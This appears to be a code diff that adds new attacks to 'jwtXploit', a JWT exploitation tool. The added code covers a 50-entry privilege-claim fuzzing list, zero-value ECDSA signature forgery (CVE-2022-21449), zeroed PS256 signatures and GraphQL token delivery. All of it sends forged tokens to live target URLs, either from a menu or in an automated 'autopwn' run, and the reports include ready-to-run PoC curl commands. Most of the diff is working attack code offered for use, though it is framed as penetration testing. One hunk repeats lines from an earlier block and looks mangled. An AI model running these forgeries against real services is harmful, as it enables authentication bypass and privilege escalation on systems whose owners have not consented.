@@ -326,6 +326,12 @@ CVE_MAP = {
     "typ_cty":        ("N/A",            "7.5", "typ/cty header mutation — bypasses audience/scope validation"),
     "sig2n":          ("N/A",            "9.1", "sig2n key recovery — RS256 public key recovered from 2 tokens"),
     "jwks_disc":      ("N/A",            "9.1", "JWKS discovery key confusion — real server key used as HMAC secret"),
+    "claim_fuzz":     ("N/A",            "9.8", "Privilege claim fuzzing — role/isAdmin/scope/permissions permutations"),
+    "cookie_sec":     ("N/A",            "6.5", "JWT cookie missing HttpOnly/Secure/SameSite security flags"),
+    "replay":         ("N/A",            "8.1", "JWT replay attack — token accepted multiple times (no replay protection)"),
+    "es384_psychic":  ("CVE-2022-21449", "9.8", "ES384/ES512 psychic signature — zero-value r/s bypass (same root as ES256)"),
+    "ps256_blinding": ("N/A",            "8.5", "PS256 RSA-PSS blinding — zero-length/crafted signature bypass"),
+    "graphql_jwt":    ("N/A",            "9.1", "GraphQL JWT injection via query variable / header confusion"),
 }
 
 # Maps attack name substrings → CVE_MAP keys (for print_result lookup)
@@ -348,6 +354,15 @@ _ATTACK_CVE_KEYS = {
     "sig2n":                  "sig2n",
     "jwks key discovery":     "jwks_disc",
     "jwks endpoint":          "jwks_disc",
+    "claim fuzz":             "claim_fuzz",
+    "privilege claim":        "claim_fuzz",
+    "cookie security":        "cookie_sec",
+    "httponly":               "cookie_sec",
+    "replay":                 "replay",
+    "es384":                  "es384_psychic",
+    "es512":                  "es384_psychic",
+    "ps256":                  "ps256_blinding",
+    "graphql":                "graphql_jwt",
 }
 
 
@@ -385,6 +400,9 @@ def recommend_attacks(header, payload):
     tips.append(("MEDIUM",   "→ #2  alg:none  (7 case variants — always worth a shot)"))
     tips.append(("MEDIUM",   "→ #9  Null Signature  (some libs skip sig check entirely)"))
     tips.append(("LOW",      "→ #1  Unverified Signature  (swap payload, keep original sig)"))
+    tips.append(("INFO",     "→ #17 Claim Fuzz  (50+ role/isAdmin/scope permutations)"))
+    tips.append(("INFO",     "→ #20 Cookie Security Flags  (run with --url to scan)"))
+    tips.append(("INFO",     "→ #21 Replay Detect  (check if server rejects reused tokens)"))
 
     exp = payload.get("exp")
     if exp and exp < int(time.time()):
@@ -555,8 +573,116 @@ def save_report(output_file, fmt):
             lines.append(f"| {i} | {f['attack']} | {status} |")
 
         content = "\n".join(lines)
+
+    # ── SARIF 2.1.0 ───────────────────────────────────────────
+    elif fmt == "sarif":
+        sev_map = {"9": "error", "8": "error", "7": "warning", "6": "warning"}
+        rules   = {}
+        results = []
+        for f in findings:
+            cve_info  = _cve_for_attack(f["attack"])
+            rule_id   = (cve_info[0] if cve_info else "JWT-FINDING").replace("-", "_")
+            cvss_maj  = (cve_info[1] if cve_info else "5.0")[0]
+            level     = sev_map.get(cvss_maj, "note")
+            desc      = cve_info[2] if cve_info else f["attack"]
+            if rule_id not in rules:
+                rules[rule_id] = {
+                    "id": rule_id,
+                    "name": f["attack"],
+                    "shortDescription": {"text": desc},
+                    "helpUri": "https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools",
+                    "defaultConfiguration": {"level": level},
+                    "properties": {
+                        "cvss": cve_info[1] if cve_info else "N/A",
+                        "tags": ["security", "jwt"],
+                    },
+                }
+            results.append({
+                "ruleId": rule_id,
+                "level": level if f.get("verified") else "note",
+                "message": {
+                    "text": f"{'CONFIRMED ACCEPTED' if f.get('verified') else 'Generated'}: {f['attack']}. "
+                            f"Delivery: {f.get('delivery', 'N/A')}. Reason: {f.get('verify_reason', '')}",
+                },
+                "properties": {
+                    "token_preview": f["token"][:80] + "...",
+                    "payload": f.get("payload", {}),
+                    "poc_curl": f.get("poc_curl", ""),
+                },
+            })
+        sarif_doc = {
+            "version": "2.1.0",
+            "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+            "runs": [{
+                "tool": {
+                    "driver": {
+                        "name": "jwtXploit",
+                        "version": "8.0",
+                        "informationUri": "https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools",
+                        "rules": list(rules.values()),
+                    }
+                },
+                "results": results,
+            }]
+        }
+        content = json.dumps(sarif_doc, indent=2, default=str)
+
+    # ── HTML ──────────────────────────────────────────────────
+    elif fmt == "html":
+        sev_css = {"9": "#e74c3c", "8": "#e67e22", "7": "#f39c12", "6": "#3498db"}
+        rows = []
+        for f in findings:
+            cve_info = _cve_for_attack(f["attack"])
+            cvss_maj = (cve_info[1] if cve_info else "5.0")[0]
+            color    = sev_css.get(cvss_maj, "#95a5a6")
+            badge    = (f'<span style="background:{color};color:#fff;padding:2px 8px;'
+                        f'border-radius:4px;font-size:12px">CVSS {cve_info[1] if cve_info else "N/A"}</span>')
+            status   = ('✅ <b>ACCEPTED</b>' if f.get("verified")
+                        else '⚪ Generated')
+            poc = ""
+            if f.get("poc_curl"):
+                escaped = f["poc_curl"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                poc = (f'<div class="poc"><b>PoC:</b><pre>{escaped}</pre>'
+                       f'<button onclick="navigator.clipboard.writeText(\'{f["poc_curl"].replace(chr(39), "&#39;")}\')">📋 Copy</button></div>')
+            rows.append(f"""
+            <tr>
+              <td>{f['attack']} {badge}</td>
+              <td>{status}</td>
+              <td>{f.get('delivery','N/A')}</td>
+              <td>{f.get('verify_reason','')}</td>
+            </tr>
+            {"<tr><td colspan='4'>" + poc + "</td></tr>" if poc else ""}
+            """)
+        html_rows = "\n".join(rows)
+        content = f"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8">
+<title>jwtXploit Report — {ts}</title>
+<style>
+  body{{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:2em}}
+  h1{{color:#f0a500}} h2{{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:4px}}
+  table{{width:100%;border-collapse:collapse;margin-top:1em}}
+  th{{background:#161b22;color:#f0a500;padding:8px;text-align:left;border:1px solid #30363d}}
+  td{{padding:8px;border:1px solid #30363d;vertical-align:top}}
+  tr:hover{{background:#161b22}} .poc{{margin-top:8px}}
+  pre{{background:#161b22;padding:12px;border-radius:6px;overflow-x:auto;color:#79c0ff;font-size:12px}}
+  button{{background:#238636;color:#fff;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;margin-top:4px}}
+  .stat{{display:inline-block;background:#161b22;border:1px solid #30363d;padding:8px 18px;margin:6px;border-radius:8px}}
+  .confirmed{{color:#3fb950;font-weight:bold}} .generated{{color:#8b949e}}
+</style></head><body>
+<h1>🔐 jwtXploit — JWT Vulnerability Report</h1>
+<p>Generated: {ts} &nbsp;|&nbsp; Token: <code>{target}</code></p>
+<h2>Summary</h2>
+<div class="stat">Tokens Generated: <b>{len(findings)}</b></div>
+<div class="stat confirmed">Confirmed Accepted: <b>{len(confirmed)}</b></div>
+<h2>Findings</h2>
+<table>
+  <tr><th>Attack</th><th>Status</th><th>Delivery</th><th>Detection Reason</th></tr>
+  {html_rows}
+</table>
+</body></html>"""
+
     else:
-        print(Fore.RED + f"[!] Unknown format '{fmt}' — use json, txt, or md.")
+        print(Fore.RED + f"[!] Unknown format '{fmt}' — use json, txt, md, sarif, or html.")
         return
 
     try:
@@ -700,6 +826,15 @@ def print_result(attack_name, token, payload, header):
         "delivery":  None,
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
     })
+
+
+def _is_graphql_url(url):
+    """Heuristic: return True if URL likely points to a GraphQL endpoint."""
+    if not url:
+        return False
+    url_lower = url.lower()
+    return any(hint in url_lower for hint in ("/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query"))
+
 
 def check_url(token, url=None):
     if not url:
@@ -877,6 +1012,40 @@ def check_url(token, url=None):
             print(Fore.RED + f"[!] Request error ('{hdr_name}'): {e}")
 
     print(Fore.RED + "\n[!] Token not accepted via any tested delivery method.")
+
+    # Delivery attempt 4: GraphQL — if endpoint looks like GraphQL, try JWT in query variable
+    if _is_graphql_url(url):
+        print(Fore.CYAN + "\n[+] GraphQL endpoint detected — trying JWT in query variable...")
+        _rate_sleep()
+        try:
+            gql_payload = {"query": "{ __typename }", "variables": {"token": token}}
+            resp = session.post(url,
+                                json=gql_payload,
+                                headers={"Authorization": f"Bearer {token}",
+                                         "Content-Type": "application/json"},
+                                timeout=timeout)
+            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
+            ok, reason = is_success(resp)
+            if ok:
+                delivery = "GraphQL: Authorization Bearer + query variable"
+                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via GraphQL!  Reason: {reason}")
+                print_response_details(resp)
+                curl = (f'curl -s -X POST "{url}" '
+                        f'-H "Authorization: Bearer {token}" '
+                        f'-H "Content-Type: application/json" '
+                        f'-d \'{{"query":"{{__typename}}","variables":{{"token":"{token}"}}}}\'')
+                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
+                if CONFIG["quiet"]:
+                    print(f"FOUND: {delivery} | {reason} | {url}")
+                if CONFIG["findings"]:
+                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
+                                                   "delivery": delivery, "poc_curl": curl})
+                    _notify_webhook(CONFIG["findings"][-1])
+                return
+        except Exception as e:
+            print(Fore.RED + f"[!] Request error (GraphQL): {e}")
+
+    print(Fore.RED + "\n[!] Token not accepted via any delivery method.")
 
 
 def print_response_details(response):
@@ -2144,6 +2313,362 @@ def attack_typ_cty_mutation(token, url=None):
             print(Fore.RED + f"[-] Mutation '{label}' error: {e}")
 
 
+            print_result(f"typ/cty Mutation — {label}", forged, modified_payload, mutated_header)
+            check_url(forged, url)
+        except Exception as e:
+            print(Fore.RED + f"[-] Mutation '{label}' error: {e}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 8 — ATTACK #17: CLAIM FUZZING ENGINE
+# ──────────────────────────────────────────────────────────────
+
+# 50+ real-world privilege claim permutations seen across bug bounty programs
+_CLAIM_FUZZ_MATRIX = [
+    # role / admin string variants
+    {"role": "admin"},
+    {"role": "administrator"},
+    {"role": "superuser"},
+    {"role": "ADMIN"},
+    {"role": "ADMINISTRATOR"},
+    {"role": "root"},
+    {"role": "owner"},
+    {"role": "super_admin"},
+    {"role": "super-admin"},
+    {"role": "sys_admin"},
+    # isAdmin boolean + string variants
+    {"isAdmin": True},
+    {"isAdmin": "true"},
+    {"isAdmin": 1},
+    {"isAdmin": "1"},
+    {"isAdmin": "yes"},
+    {"is_admin": True},
+    {"is_admin": "true"},
+    {"is_admin": 1},
+    # scope / permissions string variants
+    {"scope": "admin"},
+    {"scope": "admin:write"},
+    {"scope": "admin:read admin:write"},
+    {"scope": "*"},
+    {"scope": "openid profile email admin"},
+    {"permissions": ["admin"]},
+    {"permissions": ["admin", "write", "read"]},
+    {"permissions": ["*"]},
+    {"permissions": "admin"},
+    # groups / authorities / authorities
+    {"groups": ["admin"]},
+    {"groups": ["administrators"]},
+    {"authorities": ["ROLE_ADMIN"]},
+    {"authorities": ["ROLE_SUPER_ADMIN"]},
+    # tier / level / plan (SaaS privilege escalation)
+    {"tier": 0},
+    {"tier": -1},
+    {"tier": "enterprise"},
+    {"level": "admin"},
+    {"plan": "enterprise"},
+    {"plan": "unlimited"},
+    # user_type / account_type
+    {"user_type": "admin"},
+    {"user_type": "internal"},
+    {"account_type": "admin"},
+    {"account_type": "staff"},
+    # email domain swap (internal employee)
+    {"email": "admin@internal.local"},
+    {"email": "admin@localhost"},
+    # access / access_level
+    {"access": "admin"},
+    {"access_level": "admin"},
+    {"access_level": 0},
+    # verified / trusted (security bypass)
+    {"verified": True},
+    {"trusted": True},
+    {"internal": True},
+    {"privileged": True},
+]
+
+
+def attack_claim_fuzz(token, url=None):
+    """
+    Privilege Claim Fuzzing.
+    Iterates 50+ real-world privilege claim permutations and tests each
+    against the target. Catches role escalation, boolean bypass, scope
+    widening, tier confusion, and email-based internal access patterns.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+    alg             = original_header.get("alg", "HS256")
+
+    print(Fore.CYAN + f"\n[*] Claim Fuzzing — {len(_CLAIM_FUZZ_MATRIX)} privilege permutations...")
+
+    for fuzz_claims in _CLAIM_FUZZ_MATRIX:
+        fuzzed_payload = dict(decoded)
+        fuzzed_payload.update(fuzz_claims)
+        fuzzed_payload = apply_exp_strip(fuzzed_payload)
+
+        label = ", ".join(f"{k}={v}" for k, v in fuzz_claims.items())
+        try:
+            if alg.startswith("HS"):
+                forged = jwt.encode(fuzzed_payload, "", algorithm=alg, headers=original_header)
+            else:
+                h_b64 = base64.urlsafe_b64encode(
+                    json.dumps(original_header, separators=(",", ":")).encode()
+                ).rstrip(b"=").decode()
+                p_b64 = base64.urlsafe_b64encode(
+                    json.dumps(fuzzed_payload, separators=(",", ":")).encode()
+                ).rstrip(b"=").decode()
+                forged = f"{h_b64}.{p_b64}."
+
+            print_result(f"Claim Fuzz — {label}", forged, fuzzed_payload, original_header)
+            check_url(forged, url)
+            # If this fuzz was confirmed, stop and highlight
+            if CONFIG["findings"] and CONFIG["findings"][-1].get("verified"):
+                print(Fore.RED + Style.BRIGHT + f"\n[!] 💥 PRIVILEGE ESCALATION CONFIRMED: {label}")
+                return
+        except Exception as e:
+            print(Fore.RED + f"[-] Claim fuzz '{label}' error: {e}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 8 — ATTACK #18: ES384/ES512 PSYCHIC SIGNATURE
+# ──────────────────────────────────────────────────────────────
+
+def attack_es384_es512_psychic(token, url=None):
+    """
+    ES384 / ES512 Psychic Signature.
+    Same CVE-2022-21449 root cause as ES256 — some library builds fail to
+    validate that r and s are non-zero for all ECDSA curve sizes. Generate
+    zero-r/s tokens for both ES384 (P-384) and ES512 (P-521).
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for ES384/ES512 Psychic Signature:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    for alg in ("ES384", "ES512"):
+        forged_header = dict(original_header)
+        forged_header["alg"] = alg
+
+        h_b64 = base64.urlsafe_b64encode(
+            json.dumps(forged_header, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+        p_b64 = base64.urlsafe_b64encode(
+            json.dumps(apply_exp_strip(dict(modified_payload)), separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+        # DER-encoded signature with r=0, s=0
+        # SEQUENCE { INTEGER 0, INTEGER 0 } = 30 06 02 01 00 02 01 00
+        zero_sig_der = b"\x30\x06\x02\x01\x00\x02\x01\x00"
+        sig_b64 = base64.urlsafe_b64encode(zero_sig_der).rstrip(b"=").decode()
+
+        forged = f"{h_b64}.{p_b64}.{sig_b64}"
+        print_result(f"ES Psychic Signature (CVE-2022-21449) — {alg} zero r/s",
+                     forged, modified_payload, forged_header)
+        check_url(forged, url)
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 8 — ATTACK #19: PS256 RSA-PSS BLINDING
+# ──────────────────────────────────────────────────────────────
+
+def attack_ps256_blinding(token, url=None):
+    """
+    PS256 RSA-PSS Signature Blinding.
+    Some older Bouncy Castle / jose4j builds accept a PS256 token where
+    the signature bytes are zeroed or have wrong PSS padding length.
+    Try three variants: zero-length sig, 256 zero bytes, 512 zero bytes.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for PS256 Blinding:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    forged_header = dict(original_header)
+    forged_header["alg"] = "PS256"
+
+    h_b64 = base64.urlsafe_b64encode(
+        json.dumps(forged_header, separators=(",", ":")).encode()
+    ).rstrip(b"=").decode()
+    p_b64 = base64.urlsafe_b64encode(
+        json.dumps(apply_exp_strip(dict(modified_payload)), separators=(",", ":")).encode()
+    ).rstrip(b"=").decode()
+
+    variants = [
+        ("empty sig",      ""),
+        ("256 zero bytes", base64.urlsafe_b64encode(b"\x00" * 256).rstrip(b"=").decode()),
+        ("512 zero bytes", base64.urlsafe_b64encode(b"\x00" * 512).rstrip(b"=").decode()),
+    ]
+    for label, sig in variants:
+        forged = f"{h_b64}.{p_b64}.{sig}"
+        print_result(f"PS256 RSA-PSS Blinding — {label}", forged, modified_payload, forged_header)
+        check_url(forged, url)
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 8 — ATTACK #20: JWT COOKIE SECURITY FLAG SCANNER
+# ──────────────────────────────────────────────────────────────
+
+def attack_cookie_security(token, url=None):
+    """
+    JWT Cookie Security Flag Scanner.
+    Makes a real GET request to --url and inspects Set-Cookie headers for:
+      • Missing HttpOnly  → XSS can steal the token
+      • Missing Secure    → token sent over plain HTTP
+      • SameSite=None without Secure → CSRF exposed
+      • Missing SameSite  → CSRF risk
+    Also scans the HTML body for `localStorage.setItem` to detect client-side
+    token storage (XSS-readable even without a cookie).
+    """
+    if not url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping cookie security scan.")
+            return
+        url = input(Fore.YELLOW + "[?] Enter target URL for cookie security scan: ").strip()
+        if not url:
+            return
+
+    session  = requests.Session()
+    timeout  = CONFIG.get("timeout", 10)
+    proxy    = CONFIG.get("proxy")
+    ssl_ver  = CONFIG.get("ssl_verify", True)
+    if proxy:
+        session.proxies = {"http": proxy, "https": proxy}
+
+    print(Fore.CYAN + f"\n[+] Scanning cookie security flags at: {url}")
+    _rate_sleep()
+    try:
+        resp = session.get(url,
+                           headers={"Authorization": f"Bearer {token}"},
+                           verify=ssl_ver, timeout=timeout)
+    except Exception as e:
+        print(Fore.RED + f"[!] Request failed: {e}")
+        return
+
+    issues = []
+
+    # Scan Set-Cookie headers
+    sc_headers = resp.headers.get("Set-Cookie", "") or ""
+    for cookie_str in sc_headers.split(","):
+        cookie_str = cookie_str.strip()
+        if not cookie_str:
+            continue
+        name = cookie_str.split("=")[0].strip()
+        lower = cookie_str.lower()
+
+        if "httponly" not in lower:
+            issues.append(("HIGH",    f"Cookie '{name}' missing HttpOnly — XSS can read token"))
+        if "secure" not in lower:
+            issues.append(("HIGH",    f"Cookie '{name}' missing Secure — token sent over HTTP"))
+        if "samesite=none" in lower and "secure" not in lower:
+            issues.append(("CRITICAL", f"Cookie '{name}' SameSite=None without Secure — CSRF exposed"))
+        if "samesite" not in lower:
+            issues.append(("MEDIUM",   f"Cookie '{name}' missing SameSite — potential CSRF risk"))
+
+    # Scan response cookies via requests
+    for cookie in resp.cookies:
+        if not cookie.has_nonstandard_attr("HttpOnly") and not cookie._rest.get("HttpOnly"):
+            issues.append(("HIGH", f"Cookie '{cookie.name}' missing HttpOnly (requests jar check)"))
+
+    # Scan HTML body for localStorage usage
+    if "localstorage.setitem" in resp.text.lower():
+        issues.append(("HIGH", "localStorage.setItem detected — JWT may be stored client-side (XSS-readable)"))
+
+    if issues:
+        sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW, "MEDIUM": Fore.CYAN}
+        print(Fore.YELLOW + f"\n[+] Cookie Security Issues Found ({len(issues)}):")
+        for sev, msg in issues:
+            col = sev_color.get(sev, Fore.WHITE)
+            print(col + f"  [{sev}] {msg}")
+            finding = {
+                "attack":        f"Cookie Security — {msg}",
+                "token":         token,
+                "payload":       decode_token(token),
+                "header":        get_header(token),
+                "verified":      True,
+                "verify_reason": msg,
+                "delivery":      "Cookie header inspection",
+                "poc_curl":      f'curl -sv "{url}" -H "Authorization: Bearer {token}" | grep -i set-cookie',
+                "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+            }
+            CONFIG["findings"].append(finding)
+            _notify_webhook(finding)
+    else:
+        print(Fore.GREEN + "[+] No cookie security flag issues detected.")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 8 — ATTACK #21: TOKEN REPLAY DETECTION
+# ──────────────────────────────────────────────────────────────
+
+def attack_replay_detect(token, url=None, count=None):
+    """
+    Token Replay Detection.
+    Submits the ORIGINAL valid token N times (default 5) and checks if the
+    server accepts all of them. A secure server should reject replays after
+    first use (one-time-use nonce, jti claim enforcement, session invalidation).
+    Reports per-attempt status and flags if all N succeed (no replay protection).
+    """
+    if not url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping replay detection.")
+            return
+        url = input(Fore.YELLOW + "[?] Enter target URL for replay test: ").strip()
+        if not url:
+            return
+
+    n = count or CONFIG.get("replay_count", 5)
+
+    session = requests.Session()
+    timeout = CONFIG.get("timeout", 10)
+    proxy   = CONFIG.get("proxy")
+    ssl_ver = CONFIG.get("ssl_verify", True)
+    if proxy:
+        session.proxies = {"http": proxy, "https": proxy}
+
+    print(Fore.CYAN + f"\n[+] Replay Detection — submitting token {n} times to: {url}")
+
+    results = []
+    for i in range(1, n + 1):
+        _rate_sleep()
+        try:
+            resp = session.get(url,
+                               headers={"Authorization": f"Bearer {token}"},
+                               verify=ssl_ver, timeout=timeout)
+            accepted = resp.status_code in (200, 201, 204)
+            results.append(accepted)
+            sym = "✅" if accepted else "❌"
+            print(Fore.CYAN + f"  [{i}/{n}] {sym} HTTP {resp.status_code}")
+        except Exception as e:
+            print(Fore.RED + f"  [{i}/{n}] Request error: {e}")
+            results.append(False)
+
+    all_accepted = all(results)
+    if all_accepted:
+        msg = f"Token accepted all {n}/{n} times — NO replay protection detected"
+        print(Fore.RED + Style.BRIGHT + f"\n[!] 🔴 VULNERABLE: {msg}")
+        finding = {
+            "attack":        "JWT Replay Attack",
+            "token":         token,
+            "payload":       decode_token(token),
+            "header":        get_header(token),
+            "verified":      True,
+            "verify_reason": msg,
+            "delivery":      "Authorization: Bearer",
+            "poc_curl":      (f'for i in $(seq 1 {n}); do\n'
+                              f'  curl -s -o /dev/null -w "%{{http_code}} " '
+                              f'"{url}" -H "Authorization: Bearer {token}"\ndone'),
+            "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        }
+        CONFIG["findings"].append(finding)
+        _notify_webhook(finding)
+    elif any(results):
+        accepted_count = sum(results)
+        print(Fore.YELLOW + f"\n[~] Partial replay: {accepted_count}/{n} attempts accepted — intermittent protection")
+    else:
+        print(Fore.GREEN + f"\n[+] Replay-safe: token rejected after first use ✅")
+
+
 def run_autopwn(token, url, wordlist=None):
     """Run all automatable attack vectors non-interactively and test each against URL."""
     if not url:
@@ -2175,6 +2700,11 @@ def run_autopwn(token, url, wordlist=None):
         ("x5c Header Injection",        attack_x5c_injection),
         ("typ/cty Header Mutation",     attack_typ_cty_mutation),
         ("JWKS Key Discovery Confusion",attack_jwks_discovery),
+        ("Claim Fuzzing",               attack_claim_fuzz),
+        ("ES384/ES512 Psychic Sig",     attack_es384_es512_psychic),
+        ("PS256 PSS Blinding",          attack_ps256_blinding),
+        ("Cookie Security Flags",       attack_cookie_security),
+        ("Replay Detection",            attack_replay_detect),
     ]
     if wordlist:
         autopwn_attacks.append(
@@ -2299,8 +2829,11 @@ def main():
     parser.add_argument("--webhook",          metavar="URL", help="POST confirmed findings JSON to this URL (Slack/Discord/custom)")
     parser.add_argument("--quiet",            action="store_true", help="Machine-readable output for CI — suppress banner/color, exit 1 on finding")
     parser.add_argument("--env",              action="store_true", help="Read token from $JWTX_TOKEN, url from $JWTX_URL (keeps secrets out of shell history)")
+    parser.add_argument("--claim-fuzz",       action="store_true", help="Fast-track to privilege claim fuzzing (attack #17) — skip menu")
+    parser.add_argument("--replay",           action="store_true", help="Fast-track to token replay detection (attack #21)")
+    parser.add_argument("--replay-count",     type=int, default=5, metavar="N", help="Number of replay attempts (default: 5)")
     parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
-    parser.add_argument("--format",           choices=["json", "txt", "md"], default="json", metavar="FMT", help="Report format: json (default), txt, or md")
+    parser.add_argument("--format",           choices=["json", "txt", "md", "sarif", "html"], default="json", metavar="FMT", help="Report format: json (default), txt, md, sarif, or html")
     args = parser.parse_args()
 
     # --env: load token and url from environment variables
@@ -2332,6 +2865,7 @@ def main():
     CONFIG["rate_limit"]     = args.rate_limit
     CONFIG["jitter"]         = args.jitter
     CONFIG["webhook"]        = args.webhook
+    CONFIG["replay_count"]   = args.replay_count
 
     if args.quiet:
         print(f"INFO: jwtXploit  token={str(args.token or 'batch')[:30]}...  url={args.url or 'none'}")
@@ -2357,6 +2891,20 @@ def main():
     # --discover-jwks: fast-track to JWKS discovery attack
     if args.discover_jwks:
         attack_jwks_discovery(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --claim-fuzz: fast-track to privilege claim fuzzing
+    if args.claim_fuzz:
+        attack_claim_fuzz(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --replay: fast-track to token replay detection
+    if args.replay:
+        attack_replay_detect(args.token, args.url, count=args.replay_count)
         if CONFIG["output_file"]:
             save_report(CONFIG["output_file"], CONFIG["output_format"])
         return
@@ -2396,6 +2944,11 @@ def main():
         "14": ("sig2n RS256 Key Recovery → HS256 Confusion",     lambda t, u: attack_sig2n(t, u, token2=args.sig2n)),
         "15": ("typ/cty Header Mutation (15 variants)",          attack_typ_cty_mutation),
         "16": ("JWKS Endpoint Discovery + Key Confusion",        attack_jwks_discovery),
+        "17": ("Privilege Claim Fuzzing (50+ permutations)",     attack_claim_fuzz),
+        "18": ("ES384/ES512 Psychic Signature (CVE-2022-21449)", attack_es384_es512_psychic),
+        "19": ("PS256 RSA-PSS Signature Blinding",               attack_ps256_blinding),
+        "20": ("JWT Cookie Security Flag Scanner",               attack_cookie_security),
+        "21": ("Token Replay Detection",                         attack_replay_detect),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
